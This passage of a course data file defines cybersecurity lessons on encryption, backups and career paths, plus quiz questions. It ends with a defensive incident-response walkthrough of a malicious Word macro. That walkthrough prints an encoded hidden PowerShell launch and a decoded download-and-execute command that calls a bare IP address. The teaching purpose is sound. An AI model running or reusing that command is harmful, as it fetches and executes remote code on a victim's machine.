Patching    Publicly known vulnerabilities  Zero-days, misconfiguration`,
              "text",
              "Each covers a different failure. None covers a misconfigured permission.",
            ),
            callout(
              "info",
              "Exploited flaws are usually old",
              "The vulnerabilities used in real intrusions are overwhelmingly ones with patches available for months or years. Zero-days get the attention; unapplied patches do the damage. Patching speed is a more valuable investment than almost any detection product.",
            ),
            check(
              "An organisation blocks nearly all inbound traffic but permits all outbound. Which attacker activity does this permit?",
              [
                "Scanning their public IP ranges for open services",
                "An implant on an internal host calling out to a command-and-control server over HTTPS",
                "Brute-forcing their VPN login page",
                "Exploiting an unpatched internet-facing web server",
              ],
              1,
              "Everything else in the list arrives inbound and is blocked. Outbound-permissive rules are precisely what command-and-control relies on — the connection is initiated from inside, so inbound rules never apply to it.",
            ),
          ],
        ),
        lesson(
          "Encryption & Backups",
          "Protecting data in transit and at rest, and building recovery that survives the incident it exists for.",
          7,
          [
            text(
              "Encryption protects data in two distinct situations, and confusing them leads directly to gaps.\n\n**In transit** — data moving across a network, protected by TLS. This is close to universal now and stops interception. **At rest** — data on a disk, protected by full-disk or database encryption. This stops someone who obtains the physical media or a raw copy of the file.",
            ),
            callout(
              "important",
              "Encryption at rest does not stop a compromised credential",
              "The most common misunderstanding in the whole topic. Disk and database encryption are transparent to authorised callers — an attacker using a valid application credential reads perfectly decrypted data, because the system decrypts it for them exactly as designed. At-rest encryption protects against stolen drives, not stolen logins.",
            ),
            text(
              "**Backups** are the last line, and the discipline that makes them work is the 3-2-1 rule: three copies, on two different media, with one held offline or otherwise out of reach.\n\nThe last part is the one that matters against ransomware, because modern attacks specifically hunt for backup systems before they encrypt anything. A backup server reachable with the same domain credentials as production is not a separate copy — it is another target that happens to hold your recovery plan.",
            ),
            text(
              "Two numbers turn recovery from an aspiration into a plan. **RPO**, the recovery point objective, is how much data you can afford to lose — set by how often backups run. **RTO**, the recovery time objective, is how long you can afford to be down — set by how fast you can actually restore.\n\nNeither is knowable without testing. A team that has never timed a full restore does not have an RTO; it has a hope.",
            ),
            check(
              "A company encrypts its customer database at rest. An attacker steals valid application credentials and queries the database. What protection does the encryption provide?",
              [
                "Complete protection — the data is unreadable without the key",
                "None in this scenario, because the database decrypts transparently for an authorised credential",
                "Partial — only recently written records stay protected",
                "It converts the breach into an integrity problem instead",
              ],
              1,
              "At-rest encryption defends against someone obtaining the storage itself. An authorised query is served decrypted by design, which is why access control and credential hygiene do the work encryption is often assumed to be doing.",
            ),
          ],
        ),
      ],
    },
    {
      title: "Career Paths & Final Assessment",
      description: "Where you can go from here.",
      lessons: [
        lesson(
          "Cybersecurity Career Paths",
          "The main directions the field splits into, what each actually involves day to day, and how people move between them.",
          6,
          [
            text(
              "Security is not one job. The roles differ enough that people who enjoy one often dislike another, and the most common early mistake is assuming the whole field resembles whichever part is most visible online.\n\nThe broad split is between defending, attacking, building and investigating — with governance work alongside all of them.",
            ),
            code(
              `Path                 Day-to-day reality              Suits people who
──────────────────   ─────────────────────────────   ────────────────────────
Blue team / SOC      Triage alerts, investigate,     Like puzzles and pattern
                     write detections                recognition
Red team / pentest   Find and prove exploitable      Like breaking things and
                     paths, write them up            explaining them clearly
Security engineering Build controls, automate,       Like building systems
                     secure pipelines                more than using them
Digital forensics    Reconstruct what happened       Like meticulous, evidential
                     from artefacts                  work with a paper trail
Threat intelligence  Track actors, assess relevance  Like research and writing
GRC / compliance     Policy, risk, audit, assurance  Like translating between
                                                     technical and business`,
              "text",
              "Most careers touch several. Almost nobody starts where they end up.",
            ),
            text(
              "Two observations worth having early. Most people enter through the blue team, because SOC work is where the volume of entry-level roles is and because triage exposes you to every other discipline in small doses.\n\nAnd the boundaries are softer than the labels suggest — detection engineering needs offensive knowledge to know what to look for, and good penetration testers are the ones who can explain a finding to the team that has to fix it.",
            ),
            check(
              "Someone enjoys understanding how attacks work but prefers building durable systems to running individual engagements. Which path fits best?",
              [
                "Penetration testing, because it is the most offensive role",
                "Detection engineering or security engineering, where offensive knowledge is used to build lasting controls",
                "Compliance, because it covers all technical areas",
                "Digital forensics, because it involves reconstructing attacks",
              ],
              1,
              "The stated preference is for building something that persists rather than for the engagement itself. Detection and security engineering both depend on understanding attacks, but the output is a control that keeps working after you move on.",
            ),
          ],
        ),
        lesson(
          "Applied Scenario: Spotting the Attack",
          "One incident, worked end to end, using every idea from the course in the order you would actually meet them.",
          9,
          [
            text(
              "This lesson puts the whole course together. You are the first person to look at an alert at a mid-sized company. Nothing here needs a tool you have not met — the point is the reasoning, and the order it happens in.\n\nRead each step before the explanation, and try to decide what you would do next.",
            ),
            walkthrough(
              "From one alert to a scoped incident",
              "An EDR alert fires at 09:14: a Word document spawned PowerShell on a finance workstation. That is all you have. Work it through to a defensible conclusion about what happened and what to do.",
              [
                step(
                  "Decide whether the alert is even plausible",
                  "Before investigating, ask whether this pattern has a legitimate explanation in this environment. Office applications spawning interpreters is a classic maldoc signature, but some finance teams genuinely run macro-driven reporting.",
                  {
                    evidence: {
                      label: "EDR alert detail",
                      code: `09:14:02  WKS-FIN-04  user: j.medina
  parent: WINWORD.EXE  "Q3-Supplier-Invoice.docm"
  child:  powershell.exe -nop -w hidden -enc SQBFAFgAIAAo...`,
                    },
                    insight: "The encoded command and hidden window settle it. Legitimate reporting macros have no reason to obfuscate their arguments or hide their window.",
                  },
                ),
                step(
                  "Decode the argument before doing anything else",
                  "The encoded command is the fastest route to understanding intent. It costs seconds and determines how urgent everything else is.",
                  {
                    evidence: {
                      label: "Decoded -enc payload",
                      code: `IEX (New-Object Net.WebClient).DownloadString(
  'http://185.244.25.171/s.ps1')`,
                    },
                    insight: "It downloads and executes a second stage from a bare IP address. This is initial access followed immediately by ingress tool transfer — the second and fourth stages of the lifecycle.",
                  },
                ),
                step(
                  "Establish whether the download actually succeeded",
                  "Intent is not impact. If egress filtering blocked the connection, this is a contained near-miss rather than an active intrusion, and the response is completely different.",
                  {
                    evidence: {
                      label: "Proxy and firewall logs, 09:14",
                      code: `09:14:03  WKS-FIN-04 -> 185.244.25.171:80  ALLOWED  4.1 KB
09:14:09  WKS-FIN-04 -> 185.244.25.171:443 ALLOWED  148 B out, 96 B in
09:19:09  WKS-FIN-04 -> 185.244.25.171:443 ALLOWED  151 B out, 96 B in
09:24:09  WKS-FIN-04 -> 185.244.25.171:443 ALLOWED  148 B out, 96 B in`,
                    },
                    insight: "It succeeded, and the three later connections are five minutes apart with near-identical byte counts. That is a beacon. The host is under active control.",
                  },
                ),
                step(
                  "Scope before you contain",
                  "The instinct is to isolate the workstation immediately. Take sixty seconds first to ask whether anything has already moved — containing one host while a second is compromised achieves very little.",
                  {
                    evidence: {
                      label: "Authentication events since 09:14",
                      code: `09:22:41  j.medina  ->  FS-FIN-01   SMB  ADMIN$   SUCCESS
09:22:44  j.medina  ->  FS-FIN-01   type 3 network logon
(no prior j.medina -> FS-FIN-01 authentication in 90 days)`,
                    },
                    insight: "Lateral movement, eight minutes in. An account that has never touched this file server is now using its administrative share. The incident is two hosts, not one.",
                  },
                ),
                step(
                  "Contain both, and preserve what you will need",
                  "Isolate both hosts from the network but do not power them off — memory holds the running implant, its configuration and possibly credentials, and all of it is gone the moment the machine is shut down. Disable the account and revoke its sessions.",
                  {
                    insight: "This is the order of volatility applied under pressure: the most fragile evidence is the first to be lost and the last that can be recovered.",
                  },
                ),
                step(
                  "State what is known and what is not",
                  "Known: initial access by a macro-enabled document at 09:14, second stage retrieved, beaconing established, lateral movement to FS-FIN-01 by 09:22, both hosts isolated by 09:31. Not known: whether data was taken, how the document was delivered, and whether other recipients opened it.",
                  {
                    insight: "Naming the gaps is what makes the report usable. The three unknowns above are the next three work items, and an honest handover is worth more than a confident one.",
                  },
                ),
              ],
            ),
            text(
              "Look back at what actually did the work. Recognising a parent-child relationship that should not occur. Knowing that a bare IP address is unusual. Reading interval regularity as a beacon. Checking authentication against a baseline. Preserving volatile evidence before it evaporates.\n\nNone of it required an advanced tool. It required knowing what normal looks like, which is the whole of this course in one sentence.",
            ),
            check(
              "Why was checking authentication logs the right move before isolating the workstation?",
              [
                "Isolation would have deleted the authentication logs",
                "Containing one host while a second was already compromised would have left the intrusion active",
                "Authentication logs are only available while a host is on the network",
                "Isolation requires management approval that takes time anyway",
              ],
              1,
              "Scoping decides what containment has to cover. Sixty seconds spent establishing that a second host was involved prevented a containment action that would have looked successful while the attacker still held access.",
            ),
          ],
        ),
      ],
    },
  ],
};
